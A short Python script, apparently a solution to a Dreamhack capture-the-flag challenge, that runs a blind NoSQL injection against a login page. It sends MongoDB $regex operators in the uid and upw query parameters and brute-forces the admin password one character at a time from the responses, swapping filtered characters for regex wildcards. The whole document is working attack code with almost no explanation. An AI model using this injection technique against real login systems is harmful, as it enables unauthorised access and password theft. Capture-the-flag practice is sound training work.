import requests
import time
import string

url ='http://host3.dreamhack.games:20785/login?uid[$regex]=^adm.n&upw[$regex]=^{val}'
letters = '{}' + string.digits + string.ascii_letters
pw_length = 36 # 그냥 손으로 함

password = 'D.'
result = 'DH'
try:
    for i in range(2, pw_length):
        for letter in letters:
            new_url = url.format(val=password + letter)
            print(new_url)
            data = requests.get(new_url).text
            print(password + letter)
            time.sleep(0.5)
            if 'filter' in data:
                print('FILTER*****************************************')
            if 'admin' in data:
                password += letter
                result += letter
                password = password.replace('f', '.').replace('{', '.')
                print(password)
                break
except:
    print('error')

print(result)
print(password)
        
    


# http://host3.dreamhack.games:22991/login?uid[$regex]=^adm&upw[$regex]=^1